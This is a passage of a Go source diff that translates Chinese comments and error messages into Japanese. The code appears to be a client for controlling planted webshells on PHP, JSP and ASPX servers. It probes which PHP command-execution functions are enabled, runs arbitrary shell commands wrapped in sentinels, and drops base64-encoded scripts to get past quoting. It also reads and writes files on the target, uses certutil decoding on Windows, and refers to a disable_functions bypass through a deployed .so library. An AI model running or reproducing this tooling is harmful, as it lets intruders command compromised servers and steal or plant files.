+		return caps, opError("probe", "関数列挙のセンチネルが欠落しています（WAF によるブロック/書き換えの疑い）。エコー出力の要約: %q", excerpt(body, 200))
 	}
 	have := map[string]bool{}
 	for _, f := range strings.Split(out, ",") {
 		have[strings.TrimSpace(f)] = true
 	}
-	for _, f := range phpExecFuncs { // 按优先级序返回，而非目标枚举序
+	for _, f := range phpExecFuncs { // ターゲットの列挙順ではなく優先順位順で返す
 		if have[f] {
 			caps.funcs = append(caps.funcs, f)
 		}
@@ -565,7 +565,7 @@ func (s *HTTPShell) probePHPCaps(ctx context.Context) (phpCaps, error) {
 	return caps, nil
 }
 
-// Test 是接口要求的连通性检查：重发存活探针。加密马走 op=probe 加密探针。
+// Test はインターフェースが要求する疎通確認:存続プローブを再送する。暗号化 WebShell は op=probe の暗号化プローブを使う。
 func (s *HTTPShell) Test(ctx context.Context) error {
 	if s.enc != nil {
 		return s.enc.probe(ctx, 0)
@@ -578,7 +578,7 @@ func (s *HTTPShell) Test(ctx context.Context) error {
 			return err
 		}
 		if !strings.Contains(body, m.start+"42"+m.end) {
-			return opError("test", "哨兵未回显：马已失效或响应被拦截/改写。回显摘要: %q", excerpt(body, 200))
+			return opError("test", "センチネルがエコー出力されません：WebShell が失効したか、レスポンスがブロック/書き換えられています。エコー出力の要約: %q", excerpt(body, 200))
 		}
 		return nil
 	default:
@@ -586,19 +586,19 @@ func (s *HTTPShell) Test(ctx context.Context) error {
 	}
 }
 
-// ---------------- 命令执行 ----------------
+// ---------------- コマンド実行 ----------------
 
-// needsScriptDrop 判定命令是否走「引号规避落盘」:含单引号/双引号/换行/反斜杠的
-// 复杂命令，内联进哨兵包装层会被多层 shell 撕碎（PivotHub base.py:34-61 的教训:
-// shlex.quote 产出 '"'"' 会提前终止外层双引号）。
+// needsScriptDrop はコマンドが「クォート回避のファイル書き出し」を通るかを判定する:シングルクォート/ダブルクォート/改行/バックスラッシュを含む
+// 複雑なコマンドをセンチネルのラップ層にインライン化すると多層の shell に分解される（PivotHub base.py:34-61 の教訓:
+// shlex.quote が生成する '"'"' が外側のダブルクォートを早々に終端させる）。
 func needsScriptDrop(cmd string) bool {
 	return strings.ContainsAny(cmd, "'\"\n\\")
 }
 
-// scriptDrop 把命令 base64 落到目标临时文件再 sh 执行：包装层只见
-// `sh <文件>`（无引号风险）,命令本体不再被任何一层 shell 重新解析。
-// 临时文件用调用方命名空间前缀（复盘 R5:per-worker 前缀防多 worker 互相覆盖）
-// + 随机段，执行完清理（后台任务已 fork，不受影响）。
+// scriptDrop はコマンドを base64 でターゲットの一時ファイルに落としてから sh で実行する:ラップ層からは
+// `sh <ファイル>` しか見えず（クォートのリスクなし）、コマンド本体はどの層の shell にも再解析されない。
+// 一時ファイルには呼び出し側の名前空間プレフィックス（振り返り R5:per-worker プレフィックスで複数 worker の相互上書きを防ぐ）
+// + ランダム部を使い、実行後に削除する（バックグラウンドタスクは fork 済みなので影響しない）。
 func scriptDrop(cmd, prefix string) string {
 	var b [6]byte
 	_, _ = rand.Read(b[:])
@@ -607,18 +607,18 @@ func scriptDrop(cmd, prefix string) string {
 		" && sh " + path + "; rm -f " + path
 }
 
-// Exec 执行一条 shell 命令。stderr 合并进 stdout(webshell 无法分离）。
-// per-session 串行（复盘 R5)：同会话并发执行会经共享临时文件/交错回显串台，
-// 哨兵因此误报「马失效」——同会话强制串行，会话间仍可并发。
+// Exec は shell コマンドを 1 つ実行する。stderr は stdout にマージされる（webshell では分離できない）。
+// セッション単位で直列化する（振り返り R5）:同一セッションでの並行実行は共有の一時ファイルや交錯したエコー出力で混線し、
+// センチネルが「WebShell 失効」と誤報する——同一セッションは強制的に直列、セッション間は並行可能。
 func (s *HTTPShell) Exec(ctx context.Context, cmd string, timeout time.Duration) (string, string, error) {
 	cmd = strings.TrimSpace(cmd)
 	if cmd == "" {
-		return "", "", opError("exec", "空命令")
+		return "", "", opError("exec", "コマンドが空です")
 	}
 	s.execMu.Lock()
 	defer s.execMu.Unlock()
 	if s.lang == "aspx" {
-		// Windows cmd 无 /bin/sh 与 base64 -d，维持内联（模板是 cmd /c 形态）。
+		// Windows cmd には /bin/sh も base64 -d もないため、インラインのままにする（テンプレートは cmd /c 形式）。
 		return s.execCmd(ctx, cmd, timeout)
 	}
 	if needsScriptDrop(cmd) {
@@ -630,7 +630,7 @@ func (s *HTTPShell) Exec(ctx context.Context, cmd string, timeout time.Duration)
 	return s.execSh(ctx, cmd, timeout)
 }
 
-// execSh 是 JSP(linux sh）路径：命令嵌进哨兵包装，一次 shell 解析。
+// execSh は JSP（linux sh）の経路:コマンドをセンチネルのラップに埋め込み、shell の解析は 1 回で済ませる。
 func (s *HTTPShell) execSh(ctx context.Context, cmd string, timeout time.Duration) (string, string, error) {
 	m := newSentinel()
 	wrapped := "echo " + m.start + "; " + cmd + " 2>&1; echo " + m.end
@@ -640,12 +640,12 @@ func (s *HTTPShell) execSh(ctx context.Context, cmd string, timeout time.Duratio
 	}
 	out, ok := m.extract(body)
 	if !ok {
-		return "", "", opError("exec", "回显缺失哨兵：命令可能被 WAF 拦截或马已失效。回显摘要: %q", excerpt(body, 400))
+		return "", "", opError("exec", "エコー出力にセンチネルがありません：コマンドが WAF にブロックされたか、WebShell が失効した可能性があります。エコー出力の要約: %q", excerpt(body, 400))
 	}
 	return strings.Trim(out, "\r\n"), "", nil
 }
 
-// execCmd 是 ASPX(windows cmd）路径。
+// execCmd は ASPX（windows cmd）の経路。
 func (s *HTTPShell) execCmd(ctx context.Context, cmd string, timeout time.Duration) (string, string, error) {
 	m := newSentinel()
 	wrapped := "echo " + m.start + "& " + cmd + " 2>&1 &echo " + m.end
@@ -655,13 +655,13 @@ func (s *HTTPShell) execCmd(ctx context.Context, cmd string, timeout time.Durati
 	}
 	out, ok := m.extract(body)
 	if !ok {
-		return "", "", opError("exec", "回显缺失哨兵：命令可能被 WAF 拦截或马已失效。回显摘要: %q", excerpt(body, 400))
+		return "", "", opError("exec", "エコー出力にセンチネルがありません：コマンドが WAF にブロックされたか、WebShell が失効した可能性があります。エコー出力の要約: %q", excerpt(body, 400))
 	}
 	return strings.Trim(out, "\r\n"), "", nil
 }
 
-// phpExecPayload 生成指定函数的执行 payload（function_exists 守护：目标侧
-// 函数被禁时落 NOFUNC 哨兵，而不是静默失败）。
+// phpExecPayload は指定関数の実行 payload を生成する（function_exists によるガード:ターゲット側で
+// 関数が禁止されている場合は NOFUNC センチネルを落とし、黙って失敗しない）。
 func phpExecPayload(cmd, fn string, m sentinel) string {
 	c := `$c=base64_decode("` + b64e([]byte(cmd)) + `");`
 	body := `echo "NOFUNC";`
@@ -680,15 +680,15 @@ func phpExecPayload(cmd, fn string, m sentinel) string {
 		`echo "\n` + m.end + `";`
 }
 
-// execPHP 按记忆的可用函数执行；首选函数失败（被禁变化/拦截）时按优先级降级
-// 重试，全部失败返回带语义的错误。allowReprobe 防止重探递归。
+// execPHP は記憶した使用可能関数で実行し、先頭の関数が失敗（禁止状態の変化/ブロック）した場合は優先順位に従って降格して
+// 再試行する。すべて失敗した場合は意味の分かるエラーを返す。allowReprobe は再プローブの再帰を防ぐ。
 func (s *HTTPShell) execPHP(ctx context.Context, cmd string, timeout time.Duration, allowReprobe bool) (string, string, error) {
 	funcs := s.Funcs()
 	if len(funcs) == 0 {
-		msg := "目标 PHP 禁用了 exec/shell_exec/system/passthru(disable_functions),session_exec 直执行不可用；文件读写仍可用"
+		msg := "ターゲットの PHP では exec/shell_exec/system/passthru が禁止されており（disable_functions）、session_exec の直接実行は使用できません。ファイル読み書きは引き続き使用できます"
 		if s.bypass != "" {
-			msg += "；已登记可用绕过路径 " + s.bypass + "(.so 已投递 " + s.bypassLib +
-				"),但当前版本 session_exec 尚未接通绕过执行（留口，见 session/bypass.go)"
+			msg += "。使用可能なバイパス経路を登録済みです " + s.bypass + "（.so は配備済み " + s.bypassLib +
+				"）。ただし現行バージョンの session_exec はまだバイパス実行に接続していません（拡張点、session/bypass.go を参照）"
 		}
 		return "", "", opError("exec", "%s", msg)
 	}
@@ -697,21 +697,21 @@ func (s *HTTPShell) execPHP(ctx context.Context, cmd string, timeout time.Durati
 		m := newSentinel()
 		body, err := s.post(ctx, url.Values{s.password: {phpExecPayload(cmd, fn, m)}}, timeout)
 		if err != nil {
-			return "", "", err // 传输层失败不重试（马大概率已死）
+			return "", "", err // 伝送層の失敗は再試行しない（WebShell はほぼ確実に死んでいる）
 		}
 		out, ok := m.extract(body)
 		if !ok {
-			// 哨兵缺失：WAF 拦截或函数被禁导致 500/空回显。换下一个函数降级。
-			lastErr = opError("exec", "函数 %s 回显缺失哨兵（可能被禁/疑似被 WAF 拦截）。回显摘要: %q", fn, excerpt(body, 400))
+			// センチネル欠落：WAF のブロックや関数の禁止による 500/空のエコー出力。次の関数へ降格する。
+			lastErr = opError("exec", "関数 %s のエコー出力にセンチネルがありません（禁止/ WAF によるブロックの疑い）。エコー出力の要約: %q", fn, excerpt(body, 400))
 			continue
 		}
 		if strings.Contains(out, "NOFUNC") {
-			lastErr = opError("exec", "function_exists(%s) 为假：该函数已被 disable_functions 禁用", fn)
+			lastErr = opError("exec", "function_exists(%s) が偽です：この関数は disable_functions で無効化されています", fn)
 			continue
 		}
 		return strings.Trim(out, "\r\n"), "", nil
 	}
-	// 全部记忆函数失败：重探一次（目标 php.ini 可能变了）,再按新清单试一轮。
+	// 記憶した関数がすべて失敗：1 回だけ再プローブし（ターゲットの php.ini が変わった可能性がある）、新しい一覧でもう一巡試す。
 	if allowReprobe {
 		if caps, err := s.probePHPCaps(ctx); err == nil {
 			s.SetFuncs(caps.funcs)
@@ -724,7 +724,7 @@ func (s *HTTPShell) execPHP(ctx context.Context, cmd string, timeout time.Durati
 	if lastErr != nil {
 		return "", "", lastErr
 	}
-	return "", "", opError("exec", "目标 PHP 禁用了全部命令执行函数（disable_functions)")
+	return "", "", opError("exec", "ターゲットの PHP ではコマンド実行関数がすべて禁止されています（disable_functions）")
 }
 
 func sameStrings(a, b []string) bool {
@@ -739,9 +739,9 @@ func sameStrings(a, b []string) bool {
 	return true
 }
 
-// ---------------- 文件操作 ----------------
+// ---------------- ファイル操作 ----------------
 
-// phpFileOp 发一个 PHP 文件操作 payload 并取哨兵内容（哨兵由调用方构造并传入）。
+// phpFileOp は PHP ファイル操作 payload を 1 つ送り、センチネルの内容を取り出す（センチネルは呼び出し側が構築して渡す）。
 func (s *HTTPShell) phpFileOp(ctx context.Context, payload string, m sentinel, timeout time.Duration) (string, error) {
 	body, err := s.post(ctx, url.Values{s.password: {payload}}, timeout)
 	if err != nil {
@@ -749,15 +749,15 @@ func (s *HTTPShell) phpFileOp(ctx context.Context, payload string, m sentinel, t
 	}
 	out, ok := m.extract(body)
 	if !ok {
-		return "", opError("file", "文件操作回显缺失哨兵（可能被 WAF 拦截）。回显摘要: %q", excerpt(body, 300))
+		return "", opError("file", "ファイル操作のエコー出力にセンチネルがありません（WAF によるブロックの疑い）。エコー出力の要約: %q", excerpt(body, 300))
 	}
 	return out, nil
 }
 
-// ReadFile 读目标侧文件，按 ChunkSize 分块（base64 回传）。
+// ReadFile はターゲット側のファイルを ChunkSize ごとに分けて読む（base64 で返送）。
 func (s *HTTPShell) ReadFile(ctx context.Context, path string) ([]byte, error) {
 	if strings.TrimSpace(path) == "" {
-		return nil, opError("read", "path 为空")
+		return nil, opError("read", "path が空です")
 	}
 	if s.lang != "php" {
 		return s.readFileShell(ctx, path)
@@ -775,20 +775,20 @@ func (s *HTTPShell) ReadFile(ctx context.Context, path string) ([]byte, error) {
 			return nil, err
 		}
 		if strings.Contains(raw, "READFAIL") {
-			return nil, opError("read", "读取失败（文件不存在或无权限）: %s", path)
+			return nil, opError("read", "読み取りに失敗しました（ファイルが存在しないか権限がありません）: %s", path)
 		}
 		chunk, err := base64.StdEncoding.DecodeString(strings.TrimSpace(raw))
 		if err != nil {
-			return nil, opError("read", "回显 base64 解码失败（回显被污染）: %v", err)
+			return nil, opError("read", "エコー出力の base64 デコードに失敗しました（エコー出力が汚染されています）: %v", err)
 		}
 		out = append(out, chunk...)
 		if len(chunk) < ChunkSize {
-			return out, nil // 短块 = EOF
+			return out, nil // 短いチャンク = EOF
 		}
 	}
 }
 
-// readFileShell 是 JSP/ASPX 退化读路径：linux 用 dd 分块 + base64;windows 用 type。
+// readFileShell は JSP/ASPX のフォールバック読み取り経路：linux は dd でチャンク化 + base64、windows は type。
 func (s *HTTPShell) readFileShell(ctx context.Context, path string) ([]byte, error) {
 	if s.platform == "windows" {
 		stdout, _, err := s.execCmd(ctx, "type "+path, 30*time.Second)
@@ -807,7 +807,7 @@ func (s *HTTPShell) readFileShell(ctx context.Context, path string) ([]byte, err
 		}
 		chunk, derr := base64.StdEncoding.DecodeString(strings.TrimSpace(stdout))
 		if derr != nil {
-			return nil, opError("read", "回显 base64 解码失败: %v（原始摘要: %q)", derr, excerpt(stdout, 200))
+			return nil, opError("read", "エコー出力の base64 デコードに失敗しました: %v（元の要約: %q）", derr, excerpt(stdout, 200))
 		}
 		out = append(out, chunk...)
 		if len(chunk) < ChunkSize {
@@ -816,10 +816,10 @@ func (s *HTTPShell) readFileShell(ctx context.Context, path string) ([]byte, err
 	}
 }
 
-// WriteFile 写目标侧文件，按 ChunkSize 分块 append(base64 密文直达目标侧解码）。
+// WriteFile はターゲット側のファイルを ChunkSize ごとに append して書く（base64 の暗号文をそのままターゲット側でデコード）。
 func (s *HTTPShell) WriteFile(ctx context.Context, path string, data []byte) error {
 	if strings.TrimSpace(path) == "" {
-		return opError("write", "path 为空")
+		return opError("write", "path が空です")
 	}
 	if s.lang == "php" {
 		return s.writeFilePHP(ctx, path, data)
@@ -832,7 +832,7 @@ func (s *HTTPShell) WriteFile(ctx context.Context, path string, data []byte) err
 
 func (s *HTTPShell) writeFilePHP(ctx context.Context, path string, data []byte) error {
 	if len(data) == 0 {
-		data = []byte{} // 显式建空文件
+		data = []byte{} // 明示的に空ファイルを作る
 	}
 	for off := 0; off < len(data) || (off == 0 && len(data) == 0); off += ChunkSize {
 		end := off + ChunkSize
@@ -855,10 +855,10 @@ func (s *HTTPShell) writeFilePHP(ctx context.Context, path string, data []byte) 
 			return err
 		}
 		if strings.Contains(raw, "WRITEFAIL") {
-			return opError("write", "写入失败（目录不可写）: %s（第 %d 块）", path, off/ChunkSize+1)
+			return opError("write", "書き込みに失敗しました（ディレクトリが書き込み不可）: %s（%d 番目のチャンク）", path, off/ChunkSize+1)
 		}
 		if !strings.Contains(raw, "WRITEOK") {
-			return opError("write", "写入确认异常：目标回显 %q", excerpt(raw, 200))
+			return opError("write", "書き込みの確認が異常です：ターゲットのエコー出力 %q", excerpt(raw, 200))
 		}
 		if len(data) == 0 || end >= len(data) {
 			return nil
@@ -867,7 +867,7 @@ func (s *HTTPShell) writeFilePHP(ctx context.Context, path string, data []byte) 
 	return nil
 }
 
-// writeFileSh 是 JSP(linux）路径：分块 echo b64 | base64 -d >> 目标。
+// writeFileSh は JSP（linux）の経路:チャンクごとに echo b64 | base64 -d >> でターゲットへ書く。
 func (s *HTTPShell) writeFileSh(ctx context.Context, path string, data []byte) error {
 	q := shellQuote(path)
 	for off := 0; off < len(data) || (off == 0 && len(data) == 0); off += ChunkSize {
@@ -890,8 +890,8 @@ func (s *HTTPShell) writeFileSh(ctx context.Context, path string, data []byte) e
 	return nil
 }
 
-// writeFileCmd 是 ASPX(windows）路径：无管道 base64，先把 b64 分块 append 到
-// 临时文件，再 certutil -decode 一次成形，用完清理。
+// writeFileCmd は ASPX（windows）の経路:パイプの base64 がないため、まず b64 をチャンクごとに
+// 一時ファイルへ append し、certutil -decode で一度に整形してから削除する。
 func (s *HTTPShell) writeFileCmd(ctx context.Context, path string, data []byte) error {
 	var b [6]byte
 	_, _ = rand.Read(b[:])
@@ -913,12 +913,12 @@ func (s *HTTPShell) writeFileCmd(ctx context.Context, path string, data []byte) 
 		}
 	}
 	if _, _, err := s.execCmd(ctx, "certutil -decode -f "+tmp+" "+path+" &del /q "+tmp, 90*time.Second); err != nil {
-		return opError("write", "certutil 解码落盘失败: %v", err)
+		return opError("write", "certutil によるデコード書き込みに失敗しました: %v", err)
 	}
 	return nil
 }
 
-// shellQuote 是 sh 单引号转义（路径）。
+// shellQuote は sh のシングルクォートエスケープ（パス）。
 func shellQuote(p string) string {
 	return "'" + strings.ReplaceAll(p, "'", `'\''`) + "'"
 }
